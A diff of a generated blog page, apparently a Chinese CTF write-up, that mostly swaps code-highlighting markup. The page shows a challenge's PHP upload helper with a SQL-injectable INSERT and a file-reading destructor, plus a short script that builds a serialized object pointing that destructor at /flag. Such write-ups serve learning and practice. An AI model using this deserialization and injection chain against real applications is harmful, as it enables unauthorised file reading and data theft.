@@ -29,15 +29,7 @@
     
     
       
-      
-        
-          
-          
-          
-        
-        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
-      
-      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
     
   
 
@@ -61,6 +53,7 @@
 <!-- 自定义样式保持在最底部 -->
 
   
+<link rel="stylesheet" href="/css/mac.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/shubiao.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/toubudaziji.css">
@@ -69,7 +62,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"always","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -199,7 +192,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      516 字
+      647 字
     </span>
   
 
@@ -209,7 +202,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      18
+      11
        分钟
     </span>
   
@@ -245,115 +238,121 @@
             <!-- SEO header -->
             <h1 style="display: none">不是文件上传</h1>
             
+              <p class="note note-info">
+                
+                  本文最后更新于：1 年前
+                
+              </p>
+            
             <div class="markdown-body">
               <h2 id=""><a href="#" class="headerlink" title="__--__"></a><code>__--__</code></h2><p>题目说不是文件上传，看一下<code>www.zip</code>   </p>
 <p>没有？？</p>
 <p>看了WP，是<img src="https://ftp.bmp.ovh/imgs/2021/05/ad5b5c5bd9ee86bb.png" srcset="/img/loading.gif">   </p>
 <p><code>github</code>上搜索得到源码<img src="https://ftp.bmp.ovh/imgs/2021/05/af38783effb1d68a.png" srcset="/img/loading.gif">      </p>
 <p>主要是<code>helper.php</code>    </p>
-<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">class</span> <span class="token class-name">helper</span> <span class="token punctuation">&#123;</span>
-    <span class="token keyword">protected</span> <span class="token variable">$folder</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"pic/"</span><span class="token punctuation">;</span>
-    <span class="token keyword">protected</span> <span class="token variable">$ifview</span> <span class="token operator">=</span> <span class="token boolean constant">False</span><span class="token punctuation">;</span> 
-    <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"config.txt"</span><span class="token punctuation">;</span>
-    <span class="token comment">// The function is not yet perfect, it is not open yet.</span>
+<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span> </span>&#123;
+    <span class="hljs-keyword">protected</span> $folder = <span class="hljs-string">&quot;pic/&quot;</span>;
+    <span class="hljs-keyword">protected</span> $ifview = <span class="hljs-literal">False</span>; 
+    <span class="hljs-keyword">protected</span> $config = <span class="hljs-string">&quot;config.txt&quot;</span>;
+    <span class="hljs-comment">// The function is not yet perfect, it is not open yet.</span>
 
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token operator">=</span><span class="token double-quoted-string string">"file"</span><span class="token punctuation">)</span>
-    <span class="token punctuation">&#123;</span>
-        <span class="token variable">$fileinfo</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getfile</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"title"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-        <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"filename"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-        <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"ext"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'ext'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-        <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"path"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-        <span class="token variable">$img_ext</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$input</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$my_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"width"</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$img_ext</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"height"</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$img_ext</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"attr"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$my_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$id</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Something wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>
-        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;p>Your images is uploaded successfully. And your image's id is <span class="token interpolation"><span class="token variable">$id</span></span>.&lt;/p>"</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params">$input=<span class="hljs-string">&quot;file&quot;</span></span>)</span>
+<span class="hljs-function">    </span>&#123;
+        $fileinfo = <span class="hljs-keyword">$this</span>-&gt;getfile($input);
+        $array = <span class="hljs-keyword">array</span>();
+        $array[<span class="hljs-string">&quot;title&quot;</span>] = $fileinfo[<span class="hljs-string">&#x27;title&#x27;</span>];
+        $array[<span class="hljs-string">&quot;filename&quot;</span>] = $fileinfo[<span class="hljs-string">&#x27;filename&#x27;</span>];
+        $array[<span class="hljs-string">&quot;ext&quot;</span>] = $fileinfo[<span class="hljs-string">&#x27;ext&#x27;</span>];
+        $array[<span class="hljs-string">&quot;path&quot;</span>] = $fileinfo[<span class="hljs-string">&#x27;path&#x27;</span>];
+        $img_ext = getimagesize($_FILES[$input][<span class="hljs-string">&quot;tmp_name&quot;</span>]);
+        $my_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;width&quot;</span>=&gt;$img_ext[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;height&quot;</span>=&gt;$img_ext[<span class="hljs-number">1</span>]);
+        $array[<span class="hljs-string">&quot;attr&quot;</span>] = serialize($my_ext);
+        $id = <span class="hljs-keyword">$this</span>-&gt;save($array);
+        <span class="hljs-keyword">if</span> ($id == <span class="hljs-number">0</span>)&#123;
+            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Something wrong!&quot;</span>);
+        &#125;
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Your images is uploaded successfully. And your image&#x27;s id is <span class="hljs-subst">$id</span>.&lt;/p&gt;&quot;</span>;
+    &#125;
 
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getfile</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span>
-    <span class="token punctuation">&#123;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-            <span class="token variable">$rs</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$input</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-        <span class="token keyword">return</span> <span class="token variable">$rs</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getfile</span>(<span class="hljs-params">$input</span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($input))&#123;
+            $rs = <span class="hljs-keyword">$this</span>-&gt;check($_FILES[$input]);
+        &#125;
+        <span class="hljs-keyword">return</span> $rs;
+    &#125;
 
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span>
-    <span class="token punctuation">&#123;</span>
-        <span class="token variable">$basename</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$cate_exts</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"jpg"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"gif"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"png"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jpeg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token variable">$cate_exts</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"&lt;p>Please upload the correct image file!!!&lt;/p>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-        <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'title'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$title</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'filename'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$basename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ext'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'path'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">folder</span><span class="token punctuation">.</span><span class="token variable">$basename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params">$info</span>)</span>
+<span class="hljs-function">    </span>&#123;
+        $basename = substr(md5(time().uniqid()),<span class="hljs-number">9</span>,<span class="hljs-number">16</span>);
+        $filename = $info[<span class="hljs-string">&quot;name&quot;</span>];
+        $ext = substr(strrchr($filename, <span class="hljs-string">&#x27;.&#x27;</span>), <span class="hljs-number">1</span>);
+        $cate_exts = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>);
+        <span class="hljs-keyword">if</span>(!in_array($ext,$cate_exts))&#123;
+            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;</span>);
+        &#125;
+        $title = str_replace(<span class="hljs-string">&quot;.&quot;</span>.$ext,<span class="hljs-string">&#x27;&#x27;</span>,$filename);
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;title&#x27;</span>=&gt;$title,<span class="hljs-string">&#x27;filename&#x27;</span>=&gt;$basename.<span class="hljs-string">&quot;.&quot;</span>.$ext,<span class="hljs-string">&#x27;ext&#x27;</span>=&gt;$ext,<span class="hljs-string">&#x27;path&#x27;</span>=&gt;<span class="hljs-keyword">$this</span>-&gt;folder.$basename.<span class="hljs-string">&quot;.&quot;</span>.$ext);
+    &#125;
 
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>
-    <span class="token punctuation">&#123;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Something wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-        <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">insert_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params">$data</span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-keyword">if</span>(!$data || !is_array($data))&#123;
+            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Something wrong!&quot;</span>);
+        &#125;
+        $id = <span class="hljs-keyword">$this</span>-&gt;insert_array($data);
+        <span class="hljs-keyword">return</span> $id;
+    &#125;
 
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">insert_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>
-    <span class="token punctuation">&#123;</span>	
-        <span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"127.0.0.1"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"root"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"root"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"pic_base"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_connect_errno</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
-        <span class="token punctuation">&#123;</span> 
-            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Connect MySQL Fail:"</span><span class="token punctuation">.</span><span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-        <span class="token variable">$sql_fields</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$sql_val</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-            <span class="token variable">$key_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'*'</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token variable">$value_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'*'</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token variable">$sql_fields</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"`"</span><span class="token punctuation">.</span><span class="token variable">$key_temp</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"`"</span><span class="token punctuation">;</span>
-            <span class="token variable">$sql_val</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"'"</span><span class="token punctuation">.</span><span class="token variable">$value_temp</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"'"</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"INSERT INTO images ("</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">","</span><span class="token punctuation">,</span><span class="token variable">$sql_fields</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">") VALUES("</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">","</span><span class="token punctuation">,</span><span class="token variable">$sql_val</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">")"</span><span class="token punctuation">;</span>
-        <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">mysqli_insert_id</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert_array</span>(<span class="hljs-params">$data</span>)</span>
+<span class="hljs-function">    </span>&#123;	
+        $con = mysqli_connect(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;pic_base&quot;</span>);
+        <span class="hljs-keyword">if</span> (mysqli_connect_errno($con)) 
+        &#123; 
+            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connect MySQL Fail:&quot;</span>.mysqli_connect_error());
+        &#125;
+        $sql_fields = <span class="hljs-keyword">array</span>();
+        $sql_val = <span class="hljs-keyword">array</span>();
+        <span class="hljs-keyword">foreach</span>($data <span class="hljs-keyword">as</span> $key=&gt;$value)&#123;
+            $key_temp = str_replace(chr(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.chr(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, $key);
+            $value_temp = str_replace(chr(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.chr(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, $value);
+            $sql_fields[] = <span class="hljs-string">&quot;`&quot;</span>.$key_temp.<span class="hljs-string">&quot;`&quot;</span>;
+            $sql_val[] = <span class="hljs-string">&quot;&#x27;&quot;</span>.$value_temp.<span class="hljs-string">&quot;&#x27;&quot;</span>;
+        &#125;
+        $sql = <span class="hljs-string">&quot;INSERT INTO images (&quot;</span>.(implode(<span class="hljs-string">&quot;,&quot;</span>,$sql_fields)).<span class="hljs-string">&quot;) VALUES(&quot;</span>.(implode(<span class="hljs-string">&quot;,&quot;</span>,$sql_val)).<span class="hljs-string">&quot;)&quot;</span>;
+        mysqli_query($con, $sql);
+        $id = mysqli_insert_id($con);
+        mysqli_close($con);
+        <span class="hljs-keyword">return</span> $id;
+    &#125;
 
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">view_files</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ifview</span> <span class="token operator">==</span> <span class="token boolean constant">False</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-            <span class="token keyword">return</span> <span class="token boolean constant">False</span><span class="token punctuation">;</span>
-            <span class="token comment">//The function is not yet perfect, it is not open yet.</span>
-        <span class="token punctuation">&#125;</span>
-        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">view_files</span>(<span class="hljs-params">$path</span>)</span>&#123;
+        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;ifview == <span class="hljs-literal">False</span>)&#123;
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>;
+            <span class="hljs-comment">//The function is not yet perfect, it is not open yet.</span>
+        &#125;
+        $content = file_get_contents($path);
+        <span class="hljs-keyword">echo</span> $content;
+    &#125;
 
-    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token shell-comment comment"># Read some config html</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">view_files</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-comment"># Read some config html</span>
+        <span class="hljs-keyword">$this</span>-&gt;view_files(<span class="hljs-keyword">$this</span>-&gt;config);
+    &#125;
+&#125;
 
-<span class="token delimiter important">?></span></span></code></pre></code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
 <p>最后的这里可以利用<br><img src="https://ftp.bmp.ovh/imgs/2021/05/3e66365debf75d92.png" srcset="/img/loading.gif"></p>
-<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">class</span> <span class="token class-name">helper</span> <span class="token punctuation">&#123;</span>
-    <span class="token keyword">protected</span> <span class="token variable">$ifview</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span> 
-    <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/flag"</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">helper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?></span></span></code></pre></code></pre>
+<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span> </span>&#123;
+    <span class="hljs-keyword">protected</span> $ifview = <span class="hljs-literal">true</span>; 
+    <span class="hljs-keyword">protected</span> $config = <span class="hljs-string">&quot;/flag&quot;</span>;
+&#125;
+$a=<span class="hljs-keyword">new</span> helper();
+<span class="hljs-keyword">echo</span> serialize($a);
+<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
 <p>然后是sql <code>insert </code> 注入   </p>
